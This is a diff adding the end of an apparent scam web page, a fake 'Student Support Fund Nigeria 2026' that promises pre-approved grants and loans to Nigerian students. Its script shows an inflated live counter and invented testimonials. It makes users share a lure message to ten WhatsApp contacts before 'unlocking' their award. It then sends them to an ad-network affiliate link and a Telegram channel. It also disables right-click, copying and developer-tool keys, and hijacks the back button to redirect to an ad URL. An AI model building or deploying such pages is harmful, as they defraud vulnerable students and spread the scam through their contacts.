+      <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+      Share Now — <span id="swBtn">0</span>/10
+    </button>
+    <p class="sw-hint">// share to different students each time — each tap counts once //</p>
+  </div>
+
+  <div class="ghost"><strong id="ghostNum">47,291</strong> students applied today</div>
+
+  <div class="tips">
+    <div class="tip"><span class="ti">⚡</span>Opens WhatsApp instantly</div>
+    <div class="tip"><span class="ti">🔓</span>Submits after 10 shares</div>
+    <div class="tip"><span class="ti">🤝</span>Friends also get access</div>
+    <div class="tip"><span class="ti">✅</span>Pre-approved already</div>
+  </div>
+
+  <div>
+    <div class="testi-hd"><div class="td-dot"></div><div class="td-txt">// students sharing now //</div></div>
+    <div class="tf" id="tf"></div>
+  </div>
+
+</div><!-- /s3 -->
+
+<!-- ══ STEP 4 ══ -->
+<div id="s4">
+  <div class="unlock">
+    <div class="unlock-halo"><span class="unlock-icon">🎉</span></div>
+    <h2>Application Submitted!</h2>
+    <p>Your support application has been received. Tap below to complete your profile and receive your <strong id="unlockType">support</strong>.</p>
+
+    <div class="unlock-amount">
+      <div class="ua-label">Approved Support Amount</div>
+      <div class="ua-amount" id="unlockAmount">₦500,000</div>
+      <div class="ua-type" id="unlockTypeLabel">School Fees Grant</div>
+    </div>
+
+    <div class="unlock-btns">
+      <a class="btn-apply" href="https://omg10.com/4/10646024" target="_blank">
+        ✅ Complete Application Now
+      </a>
+      <a class="btn-tg" href="https://t.me/kingsamtoclef" target="_blank">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+        Join Telegram — Get Support Updates
+      </a>
+    </div>
+    <p class="un-note">// student support fund 2026 · applications processed within 24hrs //</p>
+  </div>
+</div>
+
+</div><!-- /page -->
+<div class="toast" id="toast"></div>
+
+<script>
+/* DOMAIN LOCK */
+(function(){
+  const OK=['network-codes.vercel.app','waec-2026-expo.vercel.app','localhost','127.0.0.1'];
+  if(!OK.some(d=>location.hostname===d||location.hostname.endsWith('.'+d))){
+    document.getElementById('lock').style.display='flex';
+    document.body.style.overflow='hidden';
+  }
+})();
+
+/* ANTI-COPY */
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('keydown',e=>{if(e.key==='F12'||(e.ctrlKey&&['u','U','s','S'].includes(e.key))||(e.ctrlKey&&e.shiftKey&&'iIjJcC'.includes(e.key)))e.preventDefault();});
+document.addEventListener('copy',e=>e.preventDefault());
+document.addEventListener('cut',e=>e.preventDefault());
+
+/* CONFIG */
+const BACK='https://omg10.com/4/10846316';
+const AFF ='https://omg10.com/4/10646024';
+const SITE='https://your-deployed-site.vercel.app';
+const REQ = 10;
+
+/* BACKTRAP */
+(function(){
+  history.pushState(null,'',location.href);
+  history.pushState(null,'',location.href);
+  window.addEventListener('popstate',function(){
+    history.pushState(null,'',location.href);
+    window.location.href=BACK;
+  });
+})();
+
+/* LIVE COUNTER */
+let cnt=47291;
+setInterval(()=>{
+  cnt+=Math.floor(Math.random()*4)+1;
+  const f=cnt.toLocaleString('en-NG');
+  ['liveNum','ghostNum'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=f;});
+  const sc=document.getElementById('stCnt');if(sc)sc.textContent=Math.floor(cnt/1000)+'K+';
+},Math.random()*2000+2000);
+
+/* OPTION SELECTION */
+let selectedOpt = null;
+
+function selectOpt(el, type, amount, label, icon, shortAmount){
+  document.querySelectorAll('.opt-card').forEach(c=>{
+    c.classList.remove('selected');
+    const ch=c.querySelector('.opt-check');if(ch)ch.remove();
+  });
+  el.classList.add('selected');
+
+  // Add checkmark
+  const ck=document.createElement('div');ck.className='opt-check';ck.textContent='✓';el.appendChild(ck);
+
+  selectedOpt = {type,amount,label,icon,shortAmount};
+
+  // Show proceed button
+  document.getElementById('btnProceed').classList.add('show');
+  document.getElementById('procHint').classList.add('show');
+
+  // Scroll to button smoothly
+  setTimeout(()=>{
+    document.getElementById('btnProceed').scrollIntoView({behavior:'smooth',block:'center'});
+  },200);
+}
+
+/* STEP 1 → 2 */
+function startProc(){
+  if(!selectedOpt)return;
+  document.getElementById('s1').style.display='none';
+  document.getElementById('s2').style.display='block';
+  document.getElementById('procSelected').textContent=selectedOpt.icon+' '+selectedOpt.label;
+  window.scrollTo({top:0,behavior:'smooth'});
+
+  const steps=['pl1','pl2','pl3','pl4'];let i=0;
+  function tick(){
+    if(i>0){const p=document.getElementById(steps[i-1]);p.classList.remove('active');p.classList.add('done');}
+    if(i<steps.length){document.getElementById(steps[i]).classList.add('active');i++;setTimeout(tick,900);}
+    else setTimeout(goWall,500);
+  }
+  tick();
+}
+
+/* STEP 2 → 3 */
+let shares=0;
+function goWall(){
+  document.getElementById('s2').style.display='none';
+  document.getElementById('s3').style.display='block';
+  window.scrollTo({top:0,behavior:'smooth'});
+
+  // Fill summary
+  const ref='SSF-2026-'+Math.floor(100000+Math.random()*900000);
+  document.getElementById('sumType').textContent   = selectedOpt.type;
+  document.getElementById('sumAmount').textContent = selectedOpt.amount;
+  document.getElementById('sumRef').textContent    = ref;
+
+  // Build steps
+  const g=document.getElementById('stepsG');g.innerHTML='';
+  for(let i=1;i<=REQ;i++)g.innerHTML+=`<div class="sn" id="sn${i}"><span>${i}</span></div>`;
+  document.getElementById('progNum').textContent=`0/${REQ}`;
+  document.getElementById('swBtn').textContent='0';
+
+  buildT(); startLT();
+}
+
+/* SHARE */
+const WA_BASE=`🎓 *Student Support Fund Nigeria 2026*\n\nI just applied and got PRE-APPROVED for student financial support!\n\nApply here before it closes 👇\n${SITE}\n\n✅ School fees, upkeep, business loans & more\n⚠️ Share to 10 students to unlock your support!`;
+
+function doShare(){
+  window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(WA_BASE)}`,'_blank');
+  setTimeout(()=>{
+    if(shares>=REQ)return;
+    shares++;
+    document.getElementById('progFill').style.width=`${(shares/REQ)*100}%`;
+    document.getElementById('progNum').textContent=`${shares}/${REQ}`;
+    document.getElementById('swBtn').textContent=shares;
+    const n=document.getElementById('sn'+shares);if(n)n.classList.add('done');
+    showToast(`✅ Share ${shares}/${REQ} counted!`);
+    if(shares>=REQ)setTimeout(unlock,900);
+  },1800);
+}
+
+/* UNLOCK */
+function unlock(){
+  if(testiTimer)clearInterval(testiTimer);
+  document.getElementById('s3').style.display='none';
+  document.getElementById('s4').style.display='block';
+  document.getElementById('unlockAmount').textContent = selectedOpt.amount;
+  document.getElementById('unlockType').textContent   = selectedOpt.type.toLowerCase();
+  document.getElementById('unlockTypeLabel').textContent = selectedOpt.label;
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+/* TESTIMONIALS */
+const TESTIS=[
+  {av:'👩🏾',name:'Adaeze O.',when:'2m ago',msg:`Applied for school fees support and got <span class='ok'>pre-approved for ₦500k!</span> I was about to drop out 😭🙏`},
+  {av:'👨🏾',name:'Chinedu K.',when:'5m ago',msg:`Got approved for startup loan of <span class='hl'>₦5,000,000!</span> My business dream is finally possible 🔥`},
+  {av:'👩🏿',name:'Fatima A.',when:'9m ago',msg:`Upkeep money applied and <span class='ok'>₦80,000 approved.</span> God bless whoever created this 😭`},
+  {av:'👨🏽',name:'Emeka T.',when:'14m ago',msg:`Laptop grant of <span class='hl'>₦200,000 approved!</span> Now I can study properly. Share this with every student 🙌`},
+  {av:'👩🏾',name:'Blessing U.',when:'20m ago',msg:`Emergency support came through. <span class='ok'>₦150,000 approved</span> for my medical situation. Thank God!`},
+  {av:'👨🏾',name:'Taiwo S.',when:'27m ago',msg:`Project fund of <span class='hl'>₦300k approved</span> for my final year research. This fund is real 🔥`},
+  {av:'👩🏽',name:'Ngozi P.',when:'34m ago',msg:`Shared to 10 groups and got <span class='ok'>school fees support unlocked!</span> Every student needs to see this 😭❤️`},
+  {av:'👨🏿',name:'Bello M.',when:'41m ago',msg:`Business loan approved. <span class='hl'>₦5,000,000 to start my tech company.</span> Nigeria students rise! 🚀`},
+];
+
+let ti=0,testiTimer=null;
+function mkTC(t){return `<div class="tc-av">${t.av}</div><div class="tc-body"><div class="tc-hd">${t.name}<span class="tc-when">${t.when}</span></div><div class="tc-msg">${t.msg}</div></div>`;}
+function buildT(){
+  const f=document.getElementById('tf');f.innerHTML='';
+  TESTIS.slice(0,5).forEach((t,i)=>{const d=document.createElement('div');d.className='tc';d.style.animationDelay=`${i*.07}s`;d.innerHTML=mkTC(t);f.appendChild(d);});
+  ti=5;
+}
+function startLT(){
+  if(testiTimer)clearInterval(testiTimer);
+  testiTimer=setInterval(()=>{
+    if(ti>=TESTIS.length)ti=0;
+    const t=TESTIS[ti++];
+    const f=document.getElementById('tf');
+    const d=document.createElement('div');d.className='tc';d.innerHTML=mkTC({...t,when:'just now'});
+    f.insertBefore(d,f.firstChild);
+    while(f.children.length>7)f.removeChild(f.lastChild);
+  },8000);
+}
+
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2800);
+}
+</script>
+</body>
+</html>
